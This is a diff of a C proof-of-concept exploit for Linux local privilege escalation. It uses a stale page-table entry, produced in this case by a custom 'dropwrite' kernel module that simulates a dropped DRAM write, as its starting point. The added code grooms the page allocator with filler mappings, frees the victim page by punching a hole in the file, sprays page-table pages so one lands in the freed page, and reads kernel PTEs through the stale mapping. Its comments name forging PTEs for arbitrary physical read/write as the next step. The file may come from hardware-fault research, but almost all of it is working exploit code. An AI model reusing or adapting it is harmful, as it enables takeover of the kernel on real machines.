@@ -1,19 +1,34 @@
 /*
- * Linux LPE PoC driven by the `dropwrite` LKM instead of the flaky
- * mem-scanning race in simulate_dropped_write.py.
+ * Linux LPE via a dropped-write "Dirty Pagetable", driven by the `dropwrite`
+ * LKM in place of the flaky mem-scanning fault sim (the LKM deterministically
+ * reproduces the dropped zap-store that leaves a stale PTE; everything after it
+ * is real, unprivileged exploitation).
  *
- * The LKM deterministically reproduces a DRAM "dropped write" that lands on a
- * leaf PTE during an mmap(MAP_FIXED) over-map: it lets the kernel zap+free the
- * old page as usual, then re-stamps the old PTE value back, leaving a present
- * PTE whose VMA now points elsewhere -- a stale mapping (which the exploit then
- * turns into a UAF via fallocate(PUNCH_HOLE) on the old memfd).
+ * Chain:
+ *   1. Pin to CPU 1 (a quiet core -> its per-CPU pageset churns less, so the
+ *      pcp->buddy flush below is deterministic).
+ *   2. Establish the deterministic stale PTE (map memfd A, arm, MAP_FIXED remap
+ *      to memfd B while the LKM drops the zap): `p` still resolves to A's page X
+ *      while its VMA points at B.
+ *   3. Punch X out of A's page cache -> X is freed onto the movable pcp list.
+ *   4. Flush X pcp->buddy the unprivileged way: a big filler stays mapped to
+ *      keep movable memory drained (X becomes ~the only movable free page),
+ *      while munmap'ing a small filler overflows the movable pcp `high`
+ *      watermark and drains the list (incl. X) into the buddy free area.
+ *   5. Spray pte-pages: map a pre-cached SHARED memfd at many fresh addresses.
+ *      Each mapping needs its own leaf pte-page (UNMOVABLE) but reuses cached
+ *      data pages (no competing movable alloc). This drains the unmovable
+ *      freelist; the fallback then steals the lone movable free page X and
+ *      hands it back as a pte-page.
+ *   6. Read the kernel PTEs through the stale mapping `p`. (Next: forge a PTE by
+ *      writing `p` -> arbitrary physical R/W -> privesc.)
  *
- * This PoC goes as far as *deterministically establishing and detecting* the
- * stale PTE. Punch-hole + grooming the freed PFN with the target object is the
- * next step, left out for now.
+ * Honest detection: the win is decided by scanning the stale mapping for
+ * PTE-shaped u64s. The LKM oracle (/sys/kernel/debug/dropwrite/state) is printed
+ * only as dev-time ground truth and is NOT in the decision path.
  *
- * Requires the dropwrite module loaded (see run_lkm.sh). Run as root (the
- * debugfs arm knob lives under /sys/kernel/debug, which is root-only).
+ * Tuned for a 512 MB / 2-CPU guest; PREFILL/FLUSH/spray budget need re-tuning
+ * for other RAM sizes. Run as root for now (LKM debugfs arm knob).
  */
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -21,94 +36,165 @@
 #include <string.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <sched.h>
 #include <sys/mman.h>
 
 #define ONE_MB   0x100000UL
-#define SZ       (2 * ONE_MB)          /* one PMD worth */
+#define SZ       (2 * ONE_MB)
 #define MAGIC_A  0xaaaaaaaau
 #define MAGIC_B  0xbbbbbbbbu
-#define ARM_PATH "/sys/kernel/debug/dropwrite/arm"
+#define MAGIC_F  0xf00df00du     /* spray file marker; its pfns show up in PTEs */
+#define DBG      "/sys/kernel/debug/dropwrite/"
 
-/* memfd filled with `magic` at the start of every page so any page reveals
- * which memfd backs it. */
+#define PREFILL_MB   256         /* big filler: STAYS mapped -> keeps movable free
+				    pool drained so X is ~the only movable free page */
+#define FLUSH_MB     8           /* small filler: munmap'd to overflow the movable
+				    pcp `high` watermark and flush X pcp->buddy */
+#define SPRAY_MAPS   60000       /* pte-page mappings to attempt (OOM-breaks earlier) */
+#define SPRAY_TOUCH  64          /* pages faulted per mapping (1 pte-page, 64 set-PTEs) */
+#define SCAN_EVERY   256         /* scan cadence */
+
 static int mk(const char *name, uint32_t magic)
 {
 	int fd = memfd_create(name, 0);
-	if (fd < 0) { perror("memfd_create"); return -1; }
-	if (ftruncate(fd, SZ)) { perror("ftruncate"); return -1; }
+	if (fd < 0 || ftruncate(fd, SZ)) { perror("memfd"); return -1; }
 	for (off_t o = 0; o < SZ; o += 0x1000) {
-		if (lseek(fd, o, SEEK_SET) < 0) { perror("lseek"); return -1; }
+		lseek(fd, o, SEEK_SET);
 		if (write(fd, &magic, 4) != 4) { perror("write"); return -1; }
 	}
 	return fd;
 }
 
-/* one-shot arm the LKM to drop the zap of `vaddr`'s leaf PTE in this mm */
-static int arm_drop(unsigned long vaddr)
+static int wr(const char *path, const char *val)
 {
-	char buf[32];
-	int n, fd = open(ARM_PATH, O_WRONLY);
-	if (fd < 0) { perror("open " ARM_PATH " (module loaded?)"); return -1; }
-	n = snprintf(buf, sizeof buf, "0x%lx", vaddr);
-	if (write(fd, buf, n) != n) { perror("arm write"); close(fd); return -1; }
+	int fd = open(path, O_WRONLY);
+	if (fd < 0) { perror(path); return -1; }
+	int n = write(fd, val, strlen(val));
 	close(fd);
-	return 0;
+	return n < 0 ? -1 : 0;
+}
+
+static void print_oracle(const char *tag)
+{
+	char buf[256];
+	int fd = open(DBG "state", O_RDONLY);
+	if (fd < 0) { printf("  [oracle %s: n/a]\n", tag); return; }
+	int n = read(fd, buf, sizeof buf - 1);
+	close(fd);
+	if (n > 0) { buf[n] = 0; printf("  [oracle %s] %s", tag, buf); }
+}
+
+/* honest detector: count PTE-shaped entries (present|user, plausible pfn) */
+static int count_ptes(volatile uint64_t *page)
+{
+	int hits = 0;
+	for (int i = 0; i < 512; i++) {
+		uint64_t e = page[i];
+		uint64_t pfn = (e >> 12) & 0xffffffffffULL;
+		if ((e & 1) && (e & 4) && pfn > 0x100 && pfn < 0x40000)
+			hits++;
+	}
+	return hits;
 }
 
 int main(void)
 {
-	setbuf(stdout, NULL); /* flush each line before any teardown wedge */
+	setbuf(stdout, NULL);
 
-	printf("hello\n");
+	/* Pin to CPU 1, not 0: CPU 0 is the noisiest core (default IRQ affinity,
+	 * timer/housekeeping), so its per-CPU pageset churns the most. A quieter
+	 * CPU's pcp list makes the pcp->buddy flush of X more deterministic. */
+	cpu_set_t set; CPU_ZERO(&set); CPU_SET(1, &set);
+	if (sched_setaffinity(0, sizeof set, &set)) perror("setaffinity");
+	wr(DBG "probe_pfn", "0");
 
+	/* spray source: a shared memfd, cached once so re-mapping it faults in
+	 * pte-pages without allocating fresh (movable) data pages. */
+	int f = mk("F", MAGIC_F);
+	if (f < 0) return 2;
+	if (mmap(NULL, SZ, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
+		 f, 0) == MAP_FAILED) { perror("cache F"); return 2; }
+
+	/* big filler: exhaust movable free (stays mapped). small filler: freed
+	 * later just to overflow the pcp and flush X to buddy. */
+	size_t fill = (size_t)PREFILL_MB * ONE_MB;
+	char *filler = mmap(NULL, fill, PROT_READ | PROT_WRITE,
+			    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (filler == MAP_FAILED) { perror("prefill"); return 2; }
+	madvise(filler, fill, MADV_NOHUGEPAGE);
+	for (size_t o = 0; o < fill; o += 0x1000) filler[o] = 1;
+
+	size_t flush = (size_t)FLUSH_MB * ONE_MB;
+	char *flusher = mmap(NULL, flush, PROT_READ | PROT_WRITE,
+			     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (flusher == MAP_FAILED) { perror("flusher"); return 2; }
+	madvise(flusher, flush, MADV_NOHUGEPAGE);
+	for (size_t o = 0; o < flush; o += 0x1000) flusher[o] = 1;
+	printf("[*] filled %d MB movable (+%d MB flusher)\n", PREFILL_MB, FLUSH_MB);
+
+	/* victim + deterministic stale PTE */
 	int a = mk("A", MAGIC_A), b = mk("B", MAGIC_B);
-	if (a < 0 || b < 0)
-		return 2;
-
-	/*
-	 * Carve a 2MB-aligned window so A occupies exactly one PMD. The
-	 * SZ-0x1000 remap below then keeps A's last page mapped, which keeps
-	 * that PMD's leaf pte-page alive across the teardown (the "don't move
-	 * the L2" trick) -- so the stale PTE the LKM restores stays valid.
-	 */
-	void *res = mmap(NULL, SZ * 2, PROT_NONE,
-			 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (a < 0 || b < 0) return 2;
+	void *res = mmap(NULL, SZ * 2, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 	if (res == MAP_FAILED) { perror("reserve"); return 2; }
-	void *p = (void *)(((uintptr_t)res + (SZ - 1)) & ~(uintptr_t)(SZ - 1));
-
-	if (mmap(p, SZ, PROT_READ | PROT_WRITE,
+	volatile uint64_t *p =
+		(void *)(((uintptr_t)res + (SZ - 1)) & ~(uintptr_t)(SZ - 1));
+	if (mmap((void *)p, SZ, PROT_READ | PROT_WRITE,
 		 MAP_SHARED | MAP_FIXED | MAP_POPULATE, a, 0) == MAP_FAILED) {
 		perror("map A"); return 2;
 	}
-
-	uint32_t before = *(volatile uint32_t *)p;
-	printf("[*] A mapped @ %p reads 0x%08x (want A=0x%08x)\n",
-	       p, before, MAGIC_A);
-	if (before != MAGIC_A) { printf("[!] setup wrong\n"); return 2; }
-
-	if (arm_drop((unsigned long)p))
-		return 2;
-	printf("[*] armed dropped-zap for %p\n", p);
-
-	/* MAP_FIXED remap to B, SZ-0x1000 to keep A's last page (and the PMD). */
-	if (mmap(p, SZ - 0x1000, PROT_READ | PROT_WRITE,
+	char armbuf[32];
+	snprintf(armbuf, sizeof armbuf, "0x%lx", (unsigned long)p);
+	if (wr(DBG "arm", armbuf)) return 2;
+	if (mmap((void *)p, SZ - 0x1000, PROT_READ | PROT_WRITE,
 		 MAP_SHARED | MAP_FIXED | MAP_POPULATE, b, 0) == MAP_FAILED) {
 		perror("remap B"); return 2;
 	}
-
-	uint32_t after = *(volatile uint32_t *)p;
-	printf("[*] after remap to B, %p reads 0x%08x\n", p, after);
-
-	if (after == MAGIC_A) {
-		printf("[+] STALE PTE: VMA points at B but the PTE still "
-		       "resolves to A's page -- dropped zap store confirmed\n");
-		return 0;
+	if (((uint32_t *)p)[0] != MAGIC_A) {
+		printf("[-] no stale PTE (0x%08x)\n", ((uint32_t *)p)[0]); return 1;
 	}
-	if (after == MAGIC_B) {
-		printf("[-] no drop (reads B): LKM didn't fire or PTE was "
-		       "re-installed\n");
-		return 1;
+	printf("[+] stale PTE established\n");
+
+	if (fallocate(a, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE, 0, 0x1000)) {
+		perror("punch"); return 2;
 	}
-	printf("[-] unexpected read 0x%08x\n", after);
+	printf("[+] freed X\n");
+	print_oracle("post-free");
+
+	/* X is parked on the movable pcp list; fallback steals from the buddy
+	 * free area. Flush pcp->buddy the UNPRIVILEGED way: free a pile of
+	 * movable pages (munmap the small filler) to overflow the movable pcp
+	 * `high` watermark -> free_pcppages_bulk drains the list (incl. X) into
+	 * the buddy free area. The big filler stays mapped, so X is ~the only
+	 * movable free page and thus the fallback steal target. */
+	munmap(flusher, flush);
+	print_oracle("post-drain");
+
+	/* drain unmovable freelist -> force fallback steal of X's movable block */
+	for (int k = 0; k < SPRAY_MAPS; k++) {
+		char *m = mmap(NULL, SZ, PROT_READ | PROT_WRITE, MAP_SHARED, f, 0);
+		if (m == MAP_FAILED) {
+			printf("[!] spray mmap failed at k=%d (addr space/mem)\n", k);
+			break;
+		}
+		/* fault a few pages: allocates this mapping's one leaf pte-page
+		 * (UNMOVABLE) and sets enough PTEs in it to be recognizable. */
+		for (int t = 0; t < SPRAY_TOUCH; t++)
+			(void)((volatile char *)m)[t * 0x1000];
+
+		if ((k % SCAN_EVERY) == 0) {
+			int n = count_ptes(p);
+			if (n > 16) {
+				printf("[+] PAGE TABLE IN THE HOLE at k=%d (%d PTEs)\n",
+				       k, n);
+				print_oracle("win");
+				for (int i = 0; i < 6; i++)
+					printf("    pte[%d]=0x%016llx\n", i,
+					       (unsigned long long)p[i]);
+				return 0;
+			}
+		}
+	}
+	printf("[-] no pte-page reclaim within budget\n");
 	return 1;
 }
